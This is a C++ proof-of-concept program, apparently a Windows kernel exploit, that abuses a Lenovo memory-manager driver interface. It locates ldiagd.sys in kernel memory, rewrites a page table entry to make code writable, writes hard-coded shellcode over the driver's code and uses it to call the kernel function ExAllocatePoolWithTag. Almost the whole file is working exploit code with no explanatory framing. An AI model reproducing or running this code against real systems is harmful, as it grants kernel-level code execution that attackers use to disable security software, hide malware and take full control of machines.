/*
Copyright 2022 <COPYRIGHT HOLDER>

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include <windows.h>
#include <stdio.h>
#include "LenovoMemoryMgr.h"
#include <iostream>
#include <conio.h>

int main() {

	LenovoMemoryMgr lm = LenovoMemoryMgr::LenovoMemoryMgr();
	
	BOOL hasInit = lm.init();
	
	if (!hasInit) 
	{
		return -1;
	}

	const auto ldiagd_address = lm.FindBase("ldiagd.sys");
	const auto address = ldiagd_address + 0x1200;

	PAGE_TABLE_ENTRY entry;
	const auto page_table_address = lm.GetPageTableInfo(address, entry);

	entry.flags.ReadWrite = 1;

	lm.WritePageTable(page_table_address, entry);

	UINT8 shellcode[] = 
	{
		0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89,
		0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x40,
		0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44,
		0x24, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B,
		0x44, 0x24, 0x20, 0x4C, 0x8B, 0x48, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20,
		0x4C, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x50,
		0x10, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x48, 0x08, 0xFF, 0x54,
		0x24, 0x28, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0x48, 0x8B, 0x49, 0x28, 0x48,
		0x89, 0x01, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC
	};

	for (int i = 0; i < sizeof(shellcode); i += 8)
	{
		lm.WriteVirtData(address + i, reinterpret_cast<UINT64*>(reinterpret_cast<UINT64>(&shellcode) + i));
	}

	const auto ex_allocate_pool = lm.GetKernelExport("ExAllocatePoolWithTag");
	const auto pool = lm.CallKernelFunction(ex_allocate_pool, 0x0, 0x1000, 0x1337, 0);

	std::cout << std::hex << pool << std::endl;
	
	lm.teardown();
	
	return 0;
}
